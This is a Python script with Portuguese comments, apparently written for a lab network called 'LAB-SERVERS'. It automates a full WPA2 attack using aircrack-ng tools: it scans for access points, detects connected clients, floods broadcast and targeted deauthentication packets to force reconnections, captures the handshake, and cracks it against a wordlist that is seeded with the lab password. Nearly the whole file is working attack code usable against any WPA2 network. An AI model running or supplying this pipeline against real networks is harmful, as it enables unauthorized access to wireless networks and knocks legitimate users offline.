#!/usr/bin/env python3
"""
WiFi WPA2 Cracking Module para LAB-SERVERS
Captura handshake e cracka password "Cibersegura"

Uso:
    # Pipeline completo (scan + captura + crack)
    python wifi_cracker.py --network "LAB-SERVERS" --interface wlan00mon

    # Capturar handshake
    python wifi_cracker.py --capture --network "LAB-SERVERS" --interface wlan00mon

    # Deauth standalone (forçar reconexão)
    python wifi_cracker.py --deauth --bssid AA:BB:CC:DD:EE:FF --interface wlan00mon

    # Crackar handshake já capturado (.cap do aircrack-ng)
    python wifi_cracker.py --crack captures/handshake_LAB-SERVERS.cap
"""

import subprocess
import os
import sys
import json
import time
import argparse
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List

class WiFiCracker:
    """Cracka redes WPA2 usando aircrack-ng"""
    
    def __init__(self, monitor_iface: str = "wlan00mon", output_dir: str = "captures"):
        self.monitor_iface = monitor_iface
        self.output_dir = output_dir
        Path(output_dir).mkdir(exist_ok=True)
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
    def check_monitor_mode(self) -> bool:
        """Verifica se interface está em modo monitor"""
        iw_paths = ["/usr/sbin/iw", "/sbin/iw", "/usr/bin/iw", "iw"]
        iw_cmd = None
        for p in iw_paths:
            if p == "iw" or os.path.isfile(p):
                iw_cmd = p
                break

        if iw_cmd is None:
            print(f"[!] iw não encontrado. Instalar: sudo apt install iw")
            return False

        try:
            result = subprocess.run(
                [iw_cmd, "dev", self.monitor_iface, "info"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode != 0:
                print(f"[!] Interface {self.monitor_iface} não encontrada!")
                return False
            return "monitor" in result.stdout.lower()
        except FileNotFoundError:
            print(f"[!] iw não encontrado. Instalar: sudo apt install iw")
            return False
        except Exception:
            print(f"[!] Interface {self.monitor_iface} não encontrada!")
            return False
    
    def scan_networks(self, timeout: int = 30) -> List[Dict]:
        """Escaneia redes WiFi disponíveis"""
        print(f"[*] Escaneando redes por {timeout}seg...")
        
        capture_file = f"{self.output_dir}/scan_{self.timestamp}"
        
        try:
            # Executar airodump-ng com output CSV
            process = subprocess.Popen(
                ["sudo", "airodump-ng", "--output-format", "csv", "-w", capture_file, self.monitor_iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(timeout)
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
            
            # Parse resultados
            csv_file = f"{capture_file}-01.csv"
            networks = self._parse_airodump_csv(csv_file)
            
            return networks
        except Exception as e:
            print(f"[!] Erro ao escanear: {e}")
            return []
    
    def detect_clients(self, bssid: str, timeout: int = 15) -> List[str]:
        """Detecta clientes (stations) conectados ao AP
        
        Returns:
            Lista de MACs dos clientes
        """
        print(f"[*] Detectando clientes conectados a {bssid}...")
        
        capture_file = f"{self.output_dir}/client_scan_{self.timestamp}"
        clients = []
        
        try:
            # Escanear por clientes
            airodump = subprocess.Popen(
                ["sudo", "airodump-ng", "--bssid", bssid, "-w", capture_file, self.monitor_iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(timeout)
            airodump.terminate()
            
            try:
                airodump.wait(timeout=3)
            except:
                airodump.kill()
            
            # Parse CSV para encontrar clientes
            csv_file = f"{capture_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                    in_stations_section = False
                    for line in f:
                        if "Station MAC" in line:
                            in_stations_section = True
                            continue
                        if in_stations_section and line.strip():
                            parts = [p.strip() for p in line.split(',')]
                            if len(parts) >= 1 and ':' in parts[0] and parts[0] != bssid:
                                client_mac = parts[0]
                                if client_mac and client_mac not in clients:
                                    clients.append(client_mac)
            
            if clients:
                print(f"[+] {len(clients)} cliente(s) detectado(s):")
                for client in clients:
                    print(f"    - {client}")
            else:
                print(f"[-] Nenhum cliente detectado (rede pode estar livre ou clientes em modo sleep)")
                
        except Exception as e:
            print(f"[!] Erro ao detectar clientes: {e}")
        
        return clients
    
    def _parse_airodump_csv(self, csv_file: str) -> List[Dict]:
        """Parse do ficheiro CSV do airodump-ng"""
        networks = []
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                in_network_section = False
                for line in f:
                    if "BSSID" in line and "First" in line:
                        in_network_section = True
                        continue
                    if "Station MAC" in line:
                        break  # Secção de clientes, parar
                    if in_network_section and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14 and parts[0] and ':' in parts[0]:
                            # ESSID é o último campo (pode ter vírgulas no nome)
                            essid = ','.join(parts[13:]).strip()
                            networks.append({
                                'bssid': parts[0].strip(),
                                'channel': parts[3].strip(),
                                'power': parts[8].strip(),
                                'beacons': parts[9].strip(),
                                'data': parts[10].strip(),
                                'security': parts[5].strip(),
                                'cipher': parts[6].strip(),
                                'auth': parts[7].strip(),
                                'essid': essid
                            })
            if networks:
                print(f"[+] {len(networks)} redes encontradas")
                for net in networks:
                    print(f"    {net['essid']:24} | {net['bssid']} | Ch {net['channel']:>2} | {net['security']}")
        except FileNotFoundError:
            print(f"[!] Ficheiro CSV não encontrado: {csv_file}")
        
        return networks
    
    def capture_handshake(self, bssid: str, essid: str, channel: str = None, timeout: int = 120) -> Optional[str]:
        """Captura WPA handshake forçando reconexão.
        
        Returns:
            Path to .cap file on success, None on failure.
        """
        print(f"[*] Capturando handshake para {essid} ({bssid})...")
        
        # Sanitizar nome do ficheiro
        sanitized_essid = "".join(c for c in essid if c.isalnum() or c in '-_') or "network"
        capture_file = f"{self.output_dir}/handshake_{sanitized_essid}_{self.timestamp}"
        
        try:
            # FASE 1: Detectar clientes
            print(f"[*] Fase 1: Detectando clientes conectados...")
            clients = self.detect_clients(bssid, timeout=10)
            print()
            
            # FASE 2: Iniciar captura
            print(f"[*] Fase 2: Iniciando captura de tráfego...")
            
            # Build airodump-ng command - usar AMBOS csv e cap formatos
            airodump_cmd = [
                "sudo", "airodump-ng",
                "--output-format", "csv,cap",  # Importante: cap format para handshake!
                "--bssid", bssid,
                "-w", capture_file,
                self.monitor_iface
            ]
            if channel:
                airodump_cmd.insert(4, "-c")
                airodump_cmd.insert(5, channel)

            print(f"[*] Iniciando airodump-ng (ouvindo e capturando tráfego)...")
            print(f"    BSSID:    {bssid}")
            if channel:
                print(f"    Canal:    {channel}")
            print(f"    Interface: {self.monitor_iface}")
            print(f"    Output:   {capture_file}")
            
            airodump = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            # Esperar airodump inicializar
            print(f"[*] Aguardando inicialização do airodump (2seg)...")
            time.sleep(2)
            
            # FASE 3: Executar deauth
            print(f"\n[*] Fase 3: Enviando deauth attack durante a escuta...")
            self.deauth_attack(bssid, count=15, rounds=4, clients=clients)
            print()
            
            # FASE 4: Capturar resposta
            print(f"[*] Fase 4: Aguardando captura de handshake (máx {timeout}seg)...")
            start = time.time()
            last_report = 0
            handshake_found = False
            
            while time.time() - start < timeout:
                elapsed = time.time() - start
                
                # Tentar encontrar arquivo .cap
                cap_file = None
                for ext in [".cap", "-01.cap"]:
                    test_file = f"{capture_file}{ext}"
                    if os.path.exists(test_file):
                        cap_file = test_file
                        break
                
                # Reportar progresso a cada 3 segundos
                if elapsed - last_report >= 3:
                    last_report = elapsed
                    
                    if cap_file:
                        file_size = os.path.getsize(cap_file)
                        print(f"    [{int(elapsed):3d}s] Capturando tráfego... {file_size:>6} bytes")
                        
                        # Verificar se tem handshake (size > 10KB geralmente tem handshake)
                        if file_size > 10000:
                            try:
                                # Usar tcpdump ou tshark para validar
                                result = subprocess.run(
                                    ["aircrack-ng", cap_file],
                                    capture_output=True,
                                    text=True,
                                    timeout=5
                                )
                                output = result.stdout + result.stderr
                                
                                # Procurar indicadores de handshake
                                if ("1 handshake" in output or 
                                    "Passphrase not in dictionary" in output or
                                    "KEY FOUND" in output.upper()):
                                    print(f"    [{int(elapsed):3d}s] ✓ HANDSHAKE DETECTADO!")
                                    handshake_found = True
                                    time.sleep(2)
                                    break
                            except Exception as check_err:
                                pass
                    else:
                        print(f"    [{int(elapsed):3d}s] Aguardando arquivo cap...")
                
                time.sleep(1)
            
            # Terminar airodump
            airodump.terminate()
            try:
                airodump.wait(timeout=3)
            except:
                airodump.kill()
            
            # Verificar resultado
            cap_file = None
            for ext in [".cap", "-01.cap"]:
                test_file = f"{capture_file}{ext}"
                if os.path.exists(test_file):
                    cap_file = test_file
                    break
            
            if handshake_found and cap_file:
                print(f"[+] Handshake capturado com sucesso: {cap_file}")
                return cap_file
            elif cap_file:
                file_size = os.path.getsize(cap_file)
                print(f"\n[!] Arquivo criado mas handshake ainda não detectado")
                print(f"    Arquivo: {cap_file} ({file_size} bytes)")
                print(f"    Tentando validar com aircrack-ng...")
                
                try:
                    result = subprocess.run(
                        ["aircrack-ng", cap_file],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    output = result.stdout + result.stderr
                    print(f"    Output: {output[:200]}")
                except:
                    pass
                    
                print(f"\n[!] DICAS para resolver:")
                print(f"    1. Apróxima-se mais do router (melhor sinal)")
                print(f"    2. Verifica se há clientes conectados: sudo airodump-ng --bssid {bssid} {self.monitor_iface}")
                print(f"    3. Força reconexão manual de um cliente")
                print(f"    4. Tenta com timeout maior: --timeout 300 ou --timeout 600")
                print(f"    5. Verifica potência da interface: sudo iwconfig {self.monitor_iface}")
                
                return cap_file  # Retorna mesmo sem validar (talvez handshake apareça depois)
            else:
                print(f"[!] Nenhum arquivo capturado")
                print(f"    Possível problema: nenhum deauth chegou ao cliente")
                return None
            
        except Exception as e:
            print(f"[!] Erro ao capturar: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def crack_password(self, cap_file: str, bssid: str, essid: str, 
                       wordlist: str = "wordlists/custom.txt") -> Optional[str]:
        """Cracka password WPA2 usando wordlist"""
        
        if not os.path.exists(wordlist):
            print(f"[!] Wordlist não encontrada: {wordlist}")
            print(f"    Criar com: python tools/wordlist_generator.py")
            return None
        
        print(f"[*] Cracking {essid}...")
        print(f"    Usando: {wordlist}")
        print(f"    Handshake: {cap_file}")
        
        try:
            result = subprocess.run(
                ["sudo", "aircrack-ng", "-w", wordlist, "-b", bssid, cap_file],
                capture_output=True,
                text=True,
                timeout=300  # 5 minutos max
            )
            
            # Parse resultado
            for line in result.stdout.split('\n'):
                if "KEY FOUND!" in line:
                    # Extract password
                    password = line.split('[')[-1].split(']')[0]
                    print(f"[+] PASSWORD ENCONTRADA: {password}")
                    return password
                elif "Parsing" in line or "Testing" in line:
                    print(f"    {line}")
            
            print(f"[-] Password não encontrada na wordlist")
            return None
            
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout após 5 minutos")
            return None
        except Exception as e:
            print(f"[!] Erro: {e}")
            return None
    
    def save_results(self, results: Dict):
        """Salva resultados em JSON"""
        output_file = f"{self.output_dir}/wifi_crack_results_{self.timestamp}.json"
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"[+] Resultados salvos: {output_file}")
        return output_file

    def deauth_attack(self, bssid: str, count: int = 5, rounds: int = 3, clients: List[str] = None) -> bool:
        """Envia pacotes deauth para forçar reconexão de clientes
        enquanto o airodump está a ouvir.
        
        Args:
            bssid: MAC do access point
            count: Número de pacotes deauth por ataque
            rounds: Número de rondas de ataque
            clients: Lista de MACs de clientes específicos (opcional)
        """
        print(f"[*] DEAUTH ATTACK (enquanto airodump ouve)")
        print(f"    Alvo:      {bssid}")
        print(f"    Interface: {self.monitor_iface}")
        print(f"    Pacotes:   {count} × {rounds} rondas")
        if clients:
            print(f"    Clientes:  {len(clients)} alvo(s) específico(s)")
        print()

        try:
            total_sent = 0
            
            for i in range(rounds):
                print(f"  [{i+1}/{rounds}] Enviando deauth broadcast...")
                
                # Deauth Broadcast - força desconexão de TODOS os clientes
                result = subprocess.run(
                    ["sudo", "aireplay-ng", "-0", str(count), "-a", bssid, self.monitor_iface],
                    capture_output=True,
                    text=True,
                    timeout=15
                )

                # Parse output para confirmar pacotes enviados
                deauth_sent_this_round = 0
                if result.stdout:
                    for line in result.stdout.strip().split('\n'):
                        if "Sent" in line or "sent" in line:
                            print(f"         {line.strip()}")
                            # Tentar extrair número de pacotes
                            parts = line.split()
                            for j, part in enumerate(parts):
                                if part.isdigit():
                                    deauth_sent_this_round = int(part)
                                    break
                
                total_sent += count

                if result.returncode != 0:
                    if "No such device" in result.stderr:
                        print(f"  [!] Erro: Interface não encontrada")
                        return False
                
                # Deauth direcionado para cada cliente
                if clients:
                    print(f"         + {len(clients)} deauth direcionado(s)...")
                    for client_mac in clients:
                        try:
                            subprocess.run(
                                ["sudo", "aireplay-ng", "-0", str(count), "-a", bssid, "-c", client_mac, self.monitor_iface],
                                capture_output=True,
                                text=True,
                                timeout=15
                            )
                            total_sent += count
                        except Exception:
                            pass

                # Aguardar antes da próxima ronda (deixa tempo para reconexão)
                if i < rounds - 1:
                    espera = 2 + i
                    print(f"         Aguardando {espera}s para reconexão...")
                    time.sleep(espera)
                else:
                    # Última ronda - enviar mais um deauth rápido
                    time.sleep(1)
                    print(f"  [Ronda extra] Enviando deauth final...")
                    subprocess.run(
                        ["sudo", "aireplay-ng", "-0", str(count), "-a", bssid, self.monitor_iface],
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    total_sent += count

            print()
            print(f"[+] DEAUTH CONCLUÍDO")
            print(f"    Total: ~{total_sent} pacotes enviados")
            print(f"    ↳ Clientes devem estar reconectando AGORA")
            print(f"    ↳ Airodump está a capturar o handshake...")
            return True

        except subprocess.TimeoutExpired:
            print(f"[!] Timeout no deauth")
            return False
        except FileNotFoundError:
            print(f"[!] aireplay-ng não encontrado. Instalar: sudo apt install aircrack-ng")
            return False
        except Exception as e:
            print(f"[!] Erro: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(
        description="WiFi WPA2 Cracker — Captura, Deauth e Cracking",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  # Scan de redes WiFi
  python wifi_cracker.py --scan-only

  # Capturar handshake da rede LAB-SERVERS (com deauth automático)
  python wifi_cracker.py --network "LAB-SERVERS" --interface wlan00mon --timeout 180

  # Deauth standalone para forçar reconexão
  python wifi_cracker.py --deauth --bssid AA:BB:CC:DD:EE:FF --interface wlan00mon

  # Pipeline completo (scan + captura + crack)
  python wifi_cracker.py --full --network "LAB-SERVERS" --wordlist wordlists/custom.txt

  # Crackar arquivo já capturado
  python wifi_cracker.py --crack captures/handshake_LAB-SERVERS.cap --bssid AA:BB:CC:DD:EE:FF --wordlist wordlists/custom.txt

DICAS para melhorar captura de handshake:
  - Aumentar timeout: use --timeout 300 ou mais
  - Aproximar-se do router (melhor sinal)
  - Dar mais potência à interface: sudo iw dev wlan00mon set txpower fixed 30
  - Usar mais deauth packets: adicione no código count=15, rounds=5
        """
    )
    parser.add_argument("--network", help="Nome da rede (ESSID)")
    parser.add_argument("--bssid", help="BSSID do access point")
    parser.add_argument("--interface", default="wlan00mon", help="Interface monitor (default: wlan00mon)")
    parser.add_argument("--wordlist", default="wordlists/custom.txt", help="Wordlist de passwords")
    parser.add_argument("--timeout", type=int, default=240, help="Timeout para captura em segundos (default: 240 = 4min)")
    parser.add_argument("--output", default="captures", help="Diretório de output")

    # Modos de operação
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--scan-only", action="store_true", help="Apenas scanear redes")
    group.add_argument("--capture", action="store_true", help="Capturar handshake (scan + deauth + captura)")
    group.add_argument("--crack", metavar="CAP_FILE", help="Crackar handshake já capturado (.cap)")
    group.add_argument("--deauth", action="store_true", help="Enviar deauth packets (forçar reconexão)")
    group.add_argument("--full", action="store_true", help="Pipeline completo (scan + capture + crack)")

    parser.add_argument("--deauth-count", type=int, default=5, help="Deauth packets por ronda (default: 5)")
    parser.add_argument("--deauth-rounds", type=int, default=3, help="Número de rondas de deauth (default: 3)")
    parser.add_argument("--channel", "-c", help="Canal WiFi (auto-detectado pelo scan se omitido)")
    parser.add_argument("--ssid", help="Alias para --network")

    args = parser.parse_args()

    # --ssid como alias de --network
    if args.ssid and not args.network:
        args.network = args.ssid

    cracker = WiFiCracker(monitor_iface=args.interface, output_dir=args.output)

    # ============================================================
    # MODO --crack: crackar ficheiro já capturado (não precisa de monitor)
    # ============================================================
    if args.crack:
        if not os.path.exists(args.crack):
            print(f"[!] Ficheiro não encontrado: {args.crack}")
            sys.exit(1)

        _ensure_wordlist(args.wordlist)

        bssid = args.bssid or "00:00:00:00:00:00"
        essid = args.network or "unknown"
        print(f"[*] Cracking WPA2 com aircrack-ng...")
        print(f"[*] Wordlist: {args.wordlist}")
        password = cracker.crack_password(args.crack, bssid, essid, args.wordlist)

        if password:
            print(f"\n[+] PASSWORD ENCONTRADA: {password}")
        else:
            print(f"\n[-] Password não encontrada na wordlist")
        return

    # ============================================================
    # Todos os outros modos precisam de monitor mode
    # ============================================================
    if not cracker.check_monitor_mode():
        print("[!] Ative monitor mode primeiro:")
        print("    sudo airmon-ng check kill")
        print(f"    sudo airmon-ng start {args.interface.replace('mon', '')}")
        sys.exit(1)

    print("[+] Interface em modo monitor!")
    print()

    # ============================================================
    # MODO --deauth: enviar deauth standalone
    # ============================================================
    if args.deauth:
        bssid = args.bssid
        if not bssid:
            if not args.network:
                print("[!] Especifica --bssid ou --network para deauth")
                sys.exit(1)
            print("[*] Escaneando para encontrar BSSID...")
            networks = cracker.scan_networks(timeout=20)
            target = next((n for n in networks if args.network.lower() in n['essid'].lower()), None)
            if not target:
                print(f"[!] Rede '{args.network}' não encontrada")
                sys.exit(1)
            bssid = target['bssid']
            print(f"[+] Encontrado: {target['essid']} ({bssid})")
            print()

        cracker.deauth_attack(bssid, count=args.deauth_count, rounds=args.deauth_rounds)
        return

    # ============================================================
    # MODO --capture: capturar handshake (com deauth automático)
    # ============================================================
    if args.capture:
        if not args.network:
            print("[!] Especifica --network ou --ssid")
            sys.exit(1)

        networks = cracker.scan_networks(timeout=20)
        target = _find_network(networks, args)
        if not target:
            sys.exit(1)

        cap_file = cracker.capture_handshake(target['bssid'], target['essid'],
                                              channel=args.channel or target.get('channel'),
                                              timeout=args.timeout)
        if cap_file:
            print(f"\n[+] HANDSHAKE CAPTURADO! → {cap_file}")
        else:
            print(f"\n[!] Falha ao capturar handshake")
        return

    # ============================================================
    # MODO --scan-only
    # ============================================================
    if args.scan_only:
        networks = cracker.scan_networks(timeout=30)
        if networks:
            print(f"\n[+] {len(networks)} redes encontradas:\n")
            for i, net in enumerate(networks, 1):
                print(f"  {i}. {net['essid']:20} | {net['bssid']} | Ch {net['channel']:>2} | {net['security']}")
        else:
            print("[-] Nenhuma rede encontrada")
        return

    # ============================================================
    # MODO --full ou default: pipeline completo
    # ============================================================
    if not args.network:
        print("[!] Especifica --network")
        parser.print_help()
        sys.exit(1)

    _ensure_wordlist(args.wordlist)

    # Fase 1: Scan
    print("=" * 60)
    print("FASE 1: SCANNING")
    print("=" * 60)
    networks = cracker.scan_networks(timeout=30)
    if not networks:
        print("[!] Nenhuma rede encontrada")
        sys.exit(1)

    print(f"\n[+] {len(networks)} redes encontradas:\n")
    for i, net in enumerate(networks, 1):
        print(f"  {i}. {net['essid']:20} | {net['bssid']} | Ch {net['channel']:>2} | {net['security']}")

    target = _find_network(networks, args)
    if not target:
        sys.exit(1)

    print(f"\n[*] Alvo: {target['essid']} ({target['bssid']})")
    print()

    # Fase 2: Captura
    print("=" * 60)
    print("FASE 2: CAPTURA DE HANDSHAKE")
    print("=" * 60)
    cap_file = cracker.capture_handshake(target['bssid'], target['essid'],
                                          channel=args.channel or target.get('channel'),
                                          timeout=args.timeout)
    if not cap_file:
        print("\n[!] Falha ao capturar handshake")
        sys.exit(1)
    print()

    # Fase 3: Cracking
    print("=" * 60)
    print("FASE 3: CRACKING")
    print("=" * 60)
    password = cracker.crack_password(cap_file, target['bssid'], target['essid'], args.wordlist)

    # Resultados
    results = {
        "timestamp": cracker.timestamp,
        "network": target['essid'],
        "bssid": target['bssid'],
        "security": target['security'],
        "capture_file": cap_file,
        "password": password,
        "wordlist": args.wordlist,
        "status": "SUCCESS" if password else "FAILED"
    }
    cracker.save_results(results)

    print()
    print("=" * 60)
    print("RESUMO")
    print("=" * 60)
    print(f"Rede    : {target['essid']}")
    print(f"BSSID   : {target['bssid']}")
    print(f"Captura : {cap_file}")
    print(f"Password: {password or '[-] Não encontrada'}")
    print()


def _ensure_wordlist(wordlist: str):
    """Criar wordlist default se não existir"""
    if not os.path.exists(wordlist):
        print(f"[*] Criando wordlist...")
        Path("wordlists").mkdir(exist_ok=True)
        with open(wordlist, 'w') as f:
            f.write("Cibersegura\n")
            f.write("password123\n")
            f.write("admin\n")
            f.write("123456\n")
        print(f"[+] Wordlist criada: {wordlist}")


def _find_network(networks, args):
    """Encontrar rede alvo nos resultados do scan"""
    if args.bssid:
        target = next((n for n in networks if n['bssid'] == args.bssid), None)
    else:
        target = next((n for n in networks if args.network.lower() in n['essid'].lower()), None)

    if not target:
        print(f"[!] Rede '{args.network}' não encontrada")
    return target

if __name__ == "__main__":
    main()
